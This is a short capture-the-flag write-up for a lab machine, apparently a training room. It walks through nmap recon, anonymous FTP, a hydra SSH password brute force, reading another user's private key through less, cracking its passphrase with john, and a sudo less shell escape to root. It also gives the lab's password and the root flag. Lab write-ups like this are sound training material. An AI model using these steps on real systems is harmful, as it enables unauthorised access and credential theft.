1. Recon
    - `nmap -sT -sC -sV -T5 -vv 10.10.246.192`

    ```bash
    port 21: anonymous login allowed | all in plain text
    port 22
    port 80: Supported Methods: GET POST OPTIONS HEAD
    ```

2. enumerate website directories(dirbuster)
    - `dirbuster -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.246.192/`
    - no directories were found

3. access the ftp server as anonymous
    - username: anonymous
    - password: anonymous@domain.com

    ```bash
    possible users found: Amy, Jake, Holt
    jake's password is weak
    ```

4. Brute force jake's password with hydra
   - `hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.81.123 ssh -t 32`
   - `login: jake   password: 987654321`


5. Access jake's session with ssh
   - `ssh jake@<target-ip>`
   - found a priv ssh key in jake's session
   - I can only run /usr/bin/less from bin
   - cd /home/holt -> found flag in user.txt
   - found amy's private key in her .ssh folder with `less .ssh/id_rsa` (guessed the name of the priv key)

6. Accessing Amy's ssh session
   - amy's ssh key has a passphrase
   - `john2ssh amy-key > amy.hash`
   - `john amy.hash --wordlist=/usr/share/wordlists/rockyou.txt`
   - her passphrase is jake1
   - brute force her password with hydra
      ```sh
      eval "$(ssh-agent -s)"
      ssh-add /path/to/amy-key
      type her password in the prompt
      ```
    - bruteforce was unsuccessful


6. enumerate target with linpeas
   - inside the local machine `scp linpeas.sh jake@<target-ip>:/dev/shm
   - chmod +x /dev/shm/linpeas.sh
   - ./linpeas
   - couldn't find anything useful



7. Had to check the walkthrough
   - by doing the command `sudo less /etc/profile` which i have permissions to execute, i can execute a simple shell command to gain root access
   - `!/bin/sh`
   - ref: https://gtfobins.github.io/gtfobins/less/
   - and just like that, i got root and the root flag: 63a9f0ea7bb98050796b649e85481845







   
